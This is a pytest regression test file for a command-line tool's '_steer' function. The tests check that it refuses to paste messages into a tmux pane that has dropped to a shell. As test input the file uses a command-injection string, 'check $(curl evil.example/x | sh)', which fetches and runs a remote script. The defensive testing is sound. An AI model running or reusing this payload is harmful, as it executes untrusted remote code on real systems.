"""Regression tests for issue #4: steer types into a dead TUI -> shell execution.

`_steer` used to check only `tmux_alive()` -- never what is in the pane. If
the TUI had exited or crashed, the pane dropped to a bash prompt and the
pasted steer message was parsed by the shell: `$(...)`, backticks, `;`, `|`
all executed.

The fix fails closed around a TUI marker check:
  1. `_pane_shows_live_tui(pane)` -- the last non-empty viewport line must
     start with the TUI input-box marker `❯`. (Last-line, not
     anywhere-in-viewport: a dead pane can leave a stale `❯` line in
     scrollback.)
  2. `_steer` polls for the marker before pasting (`_wait_live_tui`, absorbs
     the normal boot window) and refuses to send at all when it never appears.
  3. The post-send verify loop no longer reports success when the pane stops
     showing a live TUI after the paste -- a dead pane swallows the text into
     a shell, and the old "box is clear" test would have called that
     delivered.
"""
import importlib.machinery
import importlib.util
import os
import sys

import pytest

CLI_PATH = os.path.join(os.path.dirname(__file__), "..", "bin", "muse-job")


def load_script(name, path):
    sys.modules.pop(name, None)
    loader = importlib.machinery.SourceFileLoader(name, path)
    spec = importlib.util.spec_from_loader(name, loader)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    loader.exec_module(mod)
    return mod


@pytest.fixture()
def cli(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    return load_script("muse_job_cli_steer", CLI_PATH)


class FakeClock:
    """Deterministic clock so _wait_live_tui's 30s poll finishes instantly."""

    def __init__(self):
        self.now = 1000.0

    def time(self):
        return self.now

    def sleep(self, s):
        self.now += s


class FakeRun:
    """Fake tmux runner. `panes` is the capture-pane script: successive
    capture-pane calls pop from the list, and the last entry repeats."""

    def __init__(self, panes):
        self.panes = list(panes)
        self.calls = []

    def __call__(self, *argv, **kw):
        self.calls.append(argv)
        if argv[1] == "capture-pane":
            out = self.panes.pop(0) if len(self.panes) > 1 else self.panes[0]

            class P:
                returncode = 0
                stdout = out.encode()
                stderr = b""

            return P()

        class P:
            returncode = 0
            stdout = b""
            stderr = b""

        return P()

    def sent_keys(self):
        return [c for c in self.calls if c[1] == "send-keys"]

    def pasted(self):
        return [c for c in self.calls if c[1] == "paste-buffer"]


def steer_harness(cli, monkeypatch, panes, tmux_up=True):
    fr = FakeRun(panes)
    monkeypatch.setattr(cli, "run", fr)
    monkeypatch.setattr(cli, "tmux_alive", lambda slug: tmux_up)
    monkeypatch.setattr(cli, "time", FakeClock())
    return fr


LIVE_PANE = (
    "some model output\n"
    "more output\n"
    "❯ "
)

LIVE_PANE_WITH_TEXT = (
    "some model output\n"
    "❯ check $(curl evil.example/x | sh)"
)

# TUI died: stale input box visible in scrollback, shell prompt at bottom.
DEAD_PANE = (
    "some model output\n"
    "❯ previous question\n"
    "ntindle@spark-vm:~/work$ "
)

SHELL_PANE = "ntindle@spark-vm:~/work$ "


# --- _pane_shows_live_tui -----------------------------------------------------


def test_live_tui_recognized(cli):
    assert cli._pane_shows_live_tui(LIVE_PANE) is True


def test_live_tui_with_typed_text_recognized(cli):
    assert cli._pane_shows_live_tui(LIVE_PANE_WITH_TEXT) is True


def test_dead_shell_rejected(cli):
    assert cli._pane_shows_live_tui(SHELL_PANE) is False


def test_stale_input_box_in_scrollback_rejected(cli):
    # The `❯` is there, but the LAST line is a shell prompt. Marker must be
    # positional, not substring.
    assert cli._pane_shows_live_tui(DEAD_PANE) is False


def test_empty_pane_rejected(cli):
    assert cli._pane_shows_live_tui("") is False
    assert cli._pane_shows_live_tui("\n   \n") is False


# --- _steer refuses dead panes ------------------------------------------------


def test_steer_refuses_dead_pane(cli, monkeypatch):
    fr = steer_harness(cli, monkeypatch, [DEAD_PANE])
    with pytest.raises(RuntimeError, match="does not show a live TUI"):
        cli._steer("demo", "check $(curl evil.example/x | sh)")
    assert fr.pasted() == [], "must not paste into a dead pane"
    assert fr.sent_keys() == [], "must not send Enter into a dead pane"


def test_steer_refuses_bare_shell_prompt(cli, monkeypatch):
    fr = steer_harness(cli, monkeypatch, [SHELL_PANE])
    with pytest.raises(RuntimeError, match="does not show a live TUI"):
        cli._steer("demo", "harmless message")
    assert fr.pasted() == []
    assert fr.sent_keys() == []


def test_steer_still_refuses_when_tmux_down(cli, monkeypatch):
    fr = steer_harness(cli, monkeypatch, [LIVE_PANE], tmux_up=False)
    with pytest.raises(RuntimeError, match="not alive"):
        cli._steer("demo", "hi")
    assert fr.pasted() == []


# --- _steer delivers when the TUI is live -------------------------------------


def test_steer_delivers_to_live_tui(cli, monkeypatch):
    # Pre-check pane live, post-Enter capture shows the box cleared.
    fr = steer_harness(cli, monkeypatch, [LIVE_PANE, LIVE_PANE])
    assert cli._steer("demo", "status update") is True
    assert len(fr.pasted()) == 1
    assert any("Enter" in c for c in fr.sent_keys())


def test_steer_waits_through_boot_window(cli, monkeypatch):
    # TUI still booting on the first captures, marker appears later.
    fr = steer_harness(
        cli, monkeypatch, ["starting…\n", "starting…\n", LIVE_PANE, LIVE_PANE]
    )
    assert cli._steer("demo", "status update") is True
    assert len(fr.pasted()) == 1


# --- post-send: TUI dying mid-steer is not "delivered" ------------------------


def test_steer_does_not_claim_success_when_tui_dies_mid_steer(cli, monkeypatch):
    # Pre-check live; after the paste+Enter the pane is a shell (the text
    # may have been eaten by bash). The old "box is clear" test would have
    # returned True here -- it must not.
    fr = steer_harness(cli, monkeypatch, [LIVE_PANE, DEAD_PANE])
    assert cli._steer("demo", "check $(curl evil.example/x | sh)") is False
    # The paste happened before the death was observable; the point is the
    # caller now learns delivery failed instead of being told it succeeded.
